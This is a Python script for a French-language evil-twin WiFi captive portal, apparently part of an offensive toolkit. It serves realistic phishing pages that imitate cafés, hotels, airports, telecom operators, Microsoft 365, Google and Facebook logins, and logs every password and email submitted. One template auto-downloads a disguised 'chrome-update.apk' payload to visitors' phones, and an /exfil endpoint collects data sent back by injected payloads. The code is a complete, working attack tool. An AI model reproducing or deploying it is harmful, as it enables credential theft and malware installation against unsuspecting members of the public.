#!/usr/bin/env python3
"""
NexusPi — captive portal customisable, 8 templates réalistes.

Usage : sudo python3 captive_portal.py <log_path> <port> <template> <ssid> [portal_name]

  template ∈ { wifi-auth, wifi-resaisir, captcha, cafe, hotel,
                gare, airport, mall }
  ssid        : nom du réseau (substitué dans "{SSID}")
  portal_name : nom du lieu (substitué dans "{NAME}", optionnel)

Log TSV : <iso_ts>\t<client_ip>\t<JSON form data>\t<user_agent>
"""
import json
import os
import sys
import time
from html import escape
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs


# Drop zone pour les binaires (APK/EXE) servis via /dl/<filename>
# /!\ Lancé via sudo → ~/ se résout en /root/. Faut chercher le home réel
# de l'utilisateur invocant (SUDO_USER set par sudo automatiquement).
def _resolve_home() -> Path:
    real_user = os.environ.get("SUDO_USER")
    if real_user:
        try:
            import pwd
            return Path(pwd.getpwnam(real_user).pw_dir)
        except (KeyError, ImportError):
            pass
    # Fallback : essaye /home/kali (notre install par défaut)
    p = Path("/home/kali")
    if p.exists():
        return p
    return Path(os.path.expanduser("~"))


PAYLOADS_DIR = _resolve_home() / "nexuspi-data" / "payloads"


# ── CSS de base partagé ──────────────────────────────────────────────────────

BASE_CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;color:#1a1a1a;
     -webkit-font-smoothing:antialiased}
.card{padding:36px 30px;border-radius:16px;max-width:420px;width:100%;
      box-shadow:0 10px 40px rgba(0,0,0,0.10)}
.logo{font-size:48px;text-align:center;margin-bottom:8px;line-height:1}
.brand{font-size:11px;letter-spacing:3px;text-align:center;margin-bottom:6px;
       text-transform:uppercase;opacity:0.7}
h1{font-size:22px;margin-bottom:6px;font-weight:600;text-align:center}
p.sub{font-size:14px;line-height:1.5;margin-bottom:22px;text-align:center;opacity:0.75}
input{width:100%;padding:14px;margin:6px 0;background:#f4f7fa;
      border:1.5px solid #e1e8ef;border-radius:10px;font-size:16px;font-family:inherit}
input:focus{outline:none;background:white;border-color:var(--accent,#007aff)}
label.check{display:flex;align-items:center;gap:10px;padding:14px;
            background:#f4f7fa;border:1.5px solid #e1e8ef;border-radius:10px;
            margin:14px 0;cursor:pointer;font-size:14px}
label.check input{width:auto;height:auto;margin:0}
.row{display:flex;gap:10px}
.row input{flex:1}
button{width:100%;padding:14px;color:white;border:none;
       border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;
       margin-top:8px;transition:.15s;background:var(--accent,#007aff)}
button:hover{filter:brightness(0.92)}
.foot{margin-top:20px;font-size:11px;text-align:center;letter-spacing:0.4px;opacity:0.55}
.tos{font-size:11px;margin-top:10px;text-align:center;opacity:0.6;line-height:1.5}
"""


# ── Templates — chacun définit theme/logo/title/subtitle/form/button ─────────

TEMPLATES = {
    "wifi-auth": {
        "accent": "#007aff",
        "bg": "linear-gradient(180deg,#e8eef5,#f4f7fa)",
        "card_bg": "white",
        "brand": "Réseau · {SSID}",
        "logo": "📶",
        "title": "Authentification WiFi",
        "subtitle": "Connectez-vous au réseau <b>{SSID}</b> pour accéder à Internet.",
        "form": ("<input name='username' placeholder='Identifiant' autocomplete='username' required>"
                 "<input name='password' type='password' placeholder='Mot de passe' required>"),
        "button": "Se connecter",
        "foot": "Authentification sécurisée",
    },
    "wifi-resaisir": {
        "accent": "#d93025",
        "bg": "linear-gradient(180deg,#fff5f5,#fafafa)",
        "card_bg": "white",
        "brand": "Sécurité réseau",
        "logo": "🔒",
        "title": "Vérification de sécurité",
        "subtitle": ("Pour des raisons de sécurité, veuillez <b>ressaisir le mot de "
                     "passe WiFi de {SSID}</b> afin de confirmer votre identité."),
        "form": ("<input name='wifi_password' type='password' "
                 "placeholder='Mot de passe WiFi' autocomplete='current-password' required>"),
        "button": "Confirmer",
        "foot": "Connexion sécurisée",
    },
    "cafe": {
        "accent": "#8b4513",
        "bg": "linear-gradient(180deg,#f5ebe0,#faf3eb)",
        "card_bg": "#fffaf3",
        "brand": "WiFi gratuit",
        "logo": "☕",
        "title": "Bienvenue chez <b>{NAME}</b>",
        "subtitle": "Profitez de notre WiFi gratuit. Renseignez votre email pour commencer.",
        "form": ("<input name='email' type='email' placeholder='votre@email.com' required>"
                 "<label class='check'><input type='checkbox' name='newsletter'> "
                 "Recevoir nos offres par email</label>"),
        "button": "Se connecter gratuitement",
        "foot": "{NAME} · Accès WiFi offert",
    },
    "hotel": {
        "accent": "#1e3a5f",
        "bg": "linear-gradient(180deg,#e6ecf3,#f0f4f9)",
        "card_bg": "white",
        "brand": "Hôtel · WiFi clients",
        "logo": "🏨",
        "title": "{NAME}",
        "subtitle": "Bienvenue. Connectez-vous au WiFi avec vos coordonnées de séjour.",
        "form": ("<div class='row'>"
                 "<input name='room' placeholder='N° de chambre' required>"
                 "<input name='lastname' placeholder='Nom' required>"
                 "</div>"
                 "<input name='checkin' placeholder='Date arrivée (jj/mm/aaaa)' required>"),
        "button": "Activer mon accès",
        "foot": "{NAME} · Service WiFi clients",
    },
    "gare": {
        "accent": "#9c1c20",
        "bg": "linear-gradient(180deg,#f5e6e8,#faf0f1)",
        "card_bg": "white",
        "brand": "WiFi gratuit en gare",
        "logo": "🚄",
        "title": "Gare de <b>{NAME}</b>",
        "subtitle": "Profitez du WiFi gratuit pendant votre attente. Connexion limitée à 1 heure.",
        "form": ("<input name='email' type='email' placeholder='Email (pour activation)' required>"
                 "<input name='ticket' placeholder='N° de billet (optionnel)'>"),
        "button": "Démarrer la session WiFi",
        "foot": "Gare de {NAME} · WiFi voyageurs",
    },
    "airport": {
        "accent": "#0066b2",
        "bg": "linear-gradient(180deg,#e8f1fa,#f2f7fc)",
        "card_bg": "white",
        "brand": "Aéroport · WiFi gratuit",
        "logo": "✈️",
        "title": "Aéroport <b>{NAME}</b>",
        "subtitle": "WiFi gratuit pour tous les voyageurs. Identifiez-vous pour commencer.",
        "form": ("<input name='email' type='email' placeholder='Votre email' required>"
                 "<input name='flight' placeholder='N° de vol (ex: AF1234)'>"
                 "<label class='check'><input type='checkbox' name='terms' required> "
                 "J'accepte les conditions d'utilisation</label>"),
        "button": "Accéder au WiFi",
        "foot": "Aéroport {NAME} · Service WiFi voyageurs",
    },
    "mall": {
        "accent": "#c91e6d",
        "bg": "linear-gradient(180deg,#fbe7f1,#fdf2f7)",
        "card_bg": "white",
        "brand": "Centre commercial",
        "logo": "🛍️",
        "title": "{NAME}",
        "subtitle": "WiFi gratuit illimité dans tout le centre. Identifiez-vous pour profiter de nos offres.",
        "form": ("<input name='email' type='email' placeholder='votre@email.com' required>"
                 "<input name='loyalty_card' placeholder='N° carte fidélité (optionnel)'>"
                 "<label class='check'><input type='checkbox' name='offers'> "
                 "Recevoir les bons plans des enseignes</label>"),
        "button": "Profiter du WiFi gratuit",
        "foot": "{NAME} · WiFi visiteurs",
    },
    # ── Template APK-push : convainc la victime d'installer un .apk ────────
    # En mode captive, le tel ouvre cette page automatiquement (pas besoin
    # qu'elle navigue). On lui dit qu'une app est requise pour accéder au
    # WiFi. Big bouton de DL → /dl/chrome-update.apk (notre payload).
    "wifi-app": {
        "accent": "#0066b2",
        "bg": "linear-gradient(180deg,#e8f1fa,#f2f7fc)",
        "card_bg": "white",
        "brand": "WiFi {NAME}",
        "logo": "📲",
        "title": "Connexion sécurisée requise",
        "subtitle": ("Pour accéder gratuitement au WiFi de <b>{NAME}</b>, "
                     "l'application <b>Connexion Sécurisée WiFi</b> "
                     "se télécharge automatiquement."),
        "form": (
            "<a id='np_apk' href='/dl/chrome-update.apk' "
            "download='Connexion-Securisee-WiFi.apk' "
            "style='display:block;padding:18px 14px;margin:14px 0;"
            "background:var(--accent);color:white;text-align:center;"
            "border-radius:10px;font-size:17px;font-weight:600;"
            "text-decoration:none;cursor:pointer;"
            "box-shadow:0 4px 12px rgba(0,102,178,0.3)'>"
            "📥 Télécharger l'application"
            "</a>"
            # Instructions visuelles claires
            "<div style='margin:18px 0;padding:14px;background:#f4f7fa;"
            "border-radius:10px;font-size:13px;line-height:1.7;color:#444'>"
            "<b>Étapes :</b><br>"
            "1️⃣ Le téléchargement démarre automatiquement<br>"
            "2️⃣ Tapez sur la notification de téléchargement<br>"
            "3️⃣ Autorisez l'installation (si demandé)<br>"
            "4️⃣ Ouvrez l'application <b>Connexion Sécurisée WiFi</b>"
            "</div>"
            "<input name='confirm_install' type='hidden' value='oui'>"
            # Onload : essaye PLUSIEURS méthodes d'auto-DL (compatibilité large)
            "<script>"
            "function npDl(){"
            "  var a=document.getElementById('np_apk');"
            "  if(!a)return;"
            # Méthode 1 : redirect direct (force le DL en navigation captive)
            "  try{window.location.href=a.href;return;}catch(e){}"
            # Méthode 2 : click programmatique
            "  try{a.click();return;}catch(e){}"
            # Méthode 3 : event MouseEvent (plus permissif)
            "  try{a.dispatchEvent(new MouseEvent('click',"
            "    {bubbles:true,cancelable:true,view:window}));}catch(e){}"
            "}"
            "window.addEventListener('load',function(){"
            "  setTimeout(npDl,600);"
            # Re-essaie après 3 sec si la 1re n'a pas marché
            "  setTimeout(npDl,3500);"
            "});"
            "</script>"
        ),
        "button": "J'ai installé l'application — Continuer",
        "foot": "{NAME} · Service WiFi sécurisé",
    },
    # ── Portail opérateur (style hotspot Orange/Free/SFR) ─────────────
    "operator": {
        "accent": "#ff6600",
        "bg": "linear-gradient(180deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)",
        "card_bg": "rgba(255,255,255,0.97)",
        "brand": "WiFi public · {NAME}",
        "logo": "🌐",
        "title": "Connexion WiFi",
        "subtitle": ("Bienvenue sur le réseau <b>{SSID}</b>. "
                     "Identifiez-vous avec vos identifiants opérateur "
                     "pour accéder à Internet."),
        "form": ("<input name='login' placeholder='Email ou n° mobile' "
                 "autocomplete='username' required>"
                 "<input name='password' type='password' "
                 "placeholder='Mot de passe opérateur' required>"
                 "<label class='check'><input type='checkbox' name='remember'> "
                 "Se souvenir de moi sur ce réseau</label>"),
        "button": "Se connecter",
        "foot": "{NAME} · Accès WiFi sécurisé · Conditions d'utilisation",
    },
    # ── Mise à jour sécurité (demande mdp WiFi) ──────────────────────
    "update": {
        "accent": "#d93025",
        "bg": "linear-gradient(180deg,#fff5f5 0%,#ffe8e8 100%)",
        "card_bg": "white",
        "brand": "Alerte de sécurité réseau",
        "logo": "⚠️",
        "title": "Mise à jour de sécurité",
        "subtitle": ("Une <b>vulnérabilité critique</b> a été détectée sur le "
                     "routeur <b>{SSID}</b>. Pour protéger vos appareils, "
                     "veuillez confirmer le mot de passe WiFi afin d'appliquer "
                     "le correctif automatiquement."),
        "form": ("<input name='wifi_password' type='password' "
                 "placeholder='Mot de passe WiFi actuel' "
                 "autocomplete='current-password' required>"
                 "<input name='wifi_password_confirm' type='password' "
                 "placeholder='Confirmez le mot de passe' required>"),
        "button": "🔒 Appliquer la mise à jour",
        "foot": "Service de sécurité réseau · Correctif CVE-2026-0421",
    },
    # ── Corporate (style Microsoft 365) ──────────────────────────────
    "corporate": {
        "accent": "#0078d4",
        "bg": "linear-gradient(180deg,#f2f2f2,#e6e6e6)",
        "card_bg": "white",
        "brand": "",
        "logo": ("&nbsp;<svg width='44' height='44' viewBox='0 0 23 23'>"
                 "<rect x='1' y='1' width='10' height='10' fill='#f25022'/>"
                 "<rect x='12' y='1' width='10' height='10' fill='#7fba00'/>"
                 "<rect x='1' y='12' width='10' height='10' fill='#00a4ef'/>"
                 "<rect x='12' y='12' width='10' height='10' fill='#ffb900'/>"
                 "</svg>"),
        "title": "Connexion",
        "subtitle": "Connectez-vous avec votre compte professionnel pour accéder au réseau <b>{SSID}</b>.",
        "form": ("<input name='email' type='email' placeholder='user@entreprise.com' "
                 "autocomplete='username' required>"
                 "<input name='password' type='password' "
                 "placeholder='Mot de passe' required>"
                 "<label class='check'><input type='checkbox' name='keep_signed'> "
                 "Rester connecté</label>"),
        "button": "Se connecter",
        "foot": "Conditions d'utilisation · Déclaration de confidentialité",
    },
    # ── Social WiFi (Google / Facebook) ──────────────────────────────
    "social-wifi": {
        "accent": "#1a73e8",
        "bg": "linear-gradient(180deg,#f8f9fa,#e8eaed)",
        "card_bg": "white",
        "brand": "WiFi gratuit · {NAME}",
        "logo": "📶",
        "title": "WiFi gratuit",
        "subtitle": "Connectez-vous pour profiter du WiFi gratuit de <b>{NAME}</b>.",
        "form": (
            "<a onclick=\"document.getElementById('gform').style.display='block';"
            "this.style.display='none';\" "
            "style='display:block;padding:14px;margin:8px 0;"
            "background:#4285f4;color:white;text-align:center;"
            "border-radius:10px;font-size:15px;font-weight:600;"
            "text-decoration:none;cursor:pointer'>"
            "🔵 Continuer avec Google</a>"
            "<a onclick=\"document.getElementById('fform').style.display='block';"
            "this.style.display='none';\" "
            "style='display:block;padding:14px;margin:8px 0;"
            "background:#1877f2;color:white;text-align:center;"
            "border-radius:10px;font-size:15px;font-weight:600;"
            "text-decoration:none;cursor:pointer'>"
            "🔵 Continuer avec Facebook</a>"
            "<div id='gform' style='display:none;margin-top:14px'>"
            "<input name='google_email' type='email' placeholder='votre@gmail.com' required>"
            "<input name='google_password' type='password' placeholder='Mot de passe Google' required>"
            "</div>"
            "<div id='fform' style='display:none;margin-top:14px'>"
            "<input name='fb_email' type='email' placeholder='Email ou téléphone' required>"
            "<input name='fb_password' type='password' placeholder='Mot de passe Facebook' required>"
            "</div>"
        ),
        "button": "Se connecter au WiFi",
        "foot": "{NAME} · WiFi Social · Powered by Cloud Access",
    },
}


SUCCESS_HTML = """<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connecté</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;
     padding:48px 24px;text-align:center;background:#f4f7fa;color:#1a1a1a}
.ok{width:80px;height:80px;border-radius:50%;background:#34a853;
    margin:0 auto 24px;display:flex;align-items:center;justify-content:center;
    color:white;font-size:48px;line-height:1}
h1{font-size:24px;margin-bottom:12px;font-weight:600}
p{color:#5f6368;font-size:15px;line-height:1.5;max-width:380px;margin:0 auto}
.btn{display:inline-block;margin-top:24px;padding:12px 28px;
     background:#1a73e8;color:white;border-radius:8px;
     text-decoration:none;font-weight:600;font-size:15px}
</style></head>
<body>
<div class="ok">✓</div>
<h1>Vous êtes connecté</h1>
<p>Votre accès à Internet est actif.<br>
Vous pouvez fermer cette page et utiliser vos applications normalement.</p>
<a class="btn" href="https://www.google.com">Aller sur Internet</a>
</body></html>
"""


def render_page(template_id: str, ssid: str, portal_name: str) -> str:
    if template_id == "custom":
        custom_path = Path("/tmp/nexuspi/eviltwin/custom_portal.html")
        if custom_path.exists():
            html = custom_path.read_text(encoding="utf-8", errors="replace")
            name = portal_name.strip() or ssid
            return html.replace("{SSID}", escape(ssid)).replace("{NAME}", escape(name))
        template_id = "wifi-auth"
    t = TEMPLATES.get(template_id, TEMPLATES["wifi-auth"])
    name = portal_name.strip() or ssid
    ssid_e = escape(ssid)
    name_e = escape(name)

    def sub(s: str) -> str:
        return s.replace("{SSID}", ssid_e).replace("{NAME}", name_e)

    title = sub(t["title"])
    subtitle = sub(t["subtitle"])
    form = sub(t["form"])
    foot = sub(t["foot"])
    brand = sub(t["brand"])

    return f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
:root{{--accent:{t['accent']}}}
body{{background:{t['bg']};background-attachment:fixed}}
.card{{background:{t['card_bg']}}}
{BASE_CSS}
</style>
</head>
<body>
<div class="card">
<div class="logo">{t['logo']}</div>
<div class="brand">{brand}</div>
<h1>{title}</h1>
<p class="sub">{subtitle}</p>
<form method="POST" action="/login">
{form}
<button type="submit">{t['button']}</button>
<div class="tos">En continuant vous acceptez nos conditions générales d'utilisation.</div>
</form>
<p class="foot">{foot}</p>
</div>
</body>
</html>
"""


def make_handler(log_path: str, html_page: str, exfil_only: bool = False):
    class Handler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def _serve(self, html: str, status: int = 200,
                   extra_headers=None):
            self.send_response(status)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Connection", "close")
            if extra_headers:
                for k, v in extra_headers.items():
                    self.send_header(k, v)
            self.end_headers()
            self.wfile.write(html.encode("utf-8"))

        def _cors_headers(self):
            return {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "POST, OPTIONS",
                "Access-Control-Allow-Headers": "Content-Type",
            }

        def do_OPTIONS(self):
            # Preflight CORS pour le fetch des payloads
            self.send_response(204)
            for k, v in self._cors_headers().items():
                self.send_header(k, v)
            self.end_headers()

        def do_GET(self):
            # Route binaire : /dl/<filename> sert un fichier depuis PAYLOADS_DIR
            if self.path.startswith("/dl/"):
                fname = self.path[4:].split("?")[0]
                if not fname or "/" in fname or ".." in fname:
                    self.send_response(403); self.end_headers(); return
                f = PAYLOADS_DIR / fname
                if not f.exists() or not f.is_file():
                    self.send_response(404); self.end_headers(); return
                # MIME selon extension
                ext = f.suffix.lower()
                mime = {
                    ".apk": "application/vnd.android.package-archive",
                    ".exe": "application/x-msdownload",
                    ".dmg": "application/x-apple-diskimage",
                    ".pkg": "application/x-newton-compatible-pkg",
                    ".deb": "application/vnd.debian.binary-package",
                }.get(ext, "application/octet-stream")
                ua = (self.headers.get("User-Agent", "?") or "?").replace("\t", " ")
                size = f.stat().st_size
                self._log_entry("DOWNLOAD",
                                {"file": fname, "size": size, "mime": mime}, ua)
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Content-Length", str(size))
                self.send_header("Content-Disposition",
                                 f'attachment; filename="{fname}"')
                self.end_headers()
                with open(f, "rb") as ff:
                    while chunk := ff.read(65536):
                        self.wfile.write(chunk)
                return
            if exfil_only:
                self.send_response(404)
                self.end_headers()
                return
            self._serve(html_page)

        def _log_entry(self, kind: str, payload, ua: str):
            client_ip = self.client_address[0]
            try:
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')}\t"
                            f"{client_ip}\t{kind}\t"
                            f"{json.dumps(payload, ensure_ascii=False)}\t"
                            f"{ua}\n")
            except OSError:
                pass

        def do_POST(self):
            ua = (self.headers.get("User-Agent", "?") or "?").replace("\t", " ")
            try:
                length = int(self.headers.get("Content-Length", 0) or 0)
                body = self.rfile.read(length).decode("utf-8", errors="replace")
            except Exception:
                body = ""

            # Branche /exfil : body JSON, CORS, données issues d'un payload
            if self.path == "/exfil":
                try:
                    data = json.loads(body) if body else {}
                except Exception:
                    data = {"raw": body}
                self._log_entry("EXFIL", data, ua)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                for k, v in self._cors_headers().items():
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
                return

            # Branche par défaut : form portail captif
            if exfil_only:
                self.send_response(404)
                self.end_headers()
                return
            data = parse_qs(body)
            normalized = {k: v[0] if v else "" for k, v in data.items()}
            self._log_entry("FORM", normalized, ua)
            self._serve(SUCCESS_HTML)
    return Handler


def main():
    if len(sys.argv) < 5:
        print("usage: captive_portal.py <log_path> <port> <template> <ssid> [portal_name]",
              file=sys.stderr)
        sys.exit(1)
    log_path = sys.argv[1]
    port = int(sys.argv[2])
    template = sys.argv[3]
    ssid = sys.argv[4]
    portal_name = sys.argv[5] if len(sys.argv) >= 6 else ""
    # Mode "exfil" : pas de portail, juste /exfil (utilisé en MITM côté backend)
    exfil_only = (template == "exfil")
    html_page = "" if exfil_only else render_page(template, ssid, portal_name)
    HTTPServer(
        ("0.0.0.0", port),
        make_handler(log_path, html_page, exfil_only=exfil_only),
    ).serve_forever()


if __name__ == "__main__":
    main()
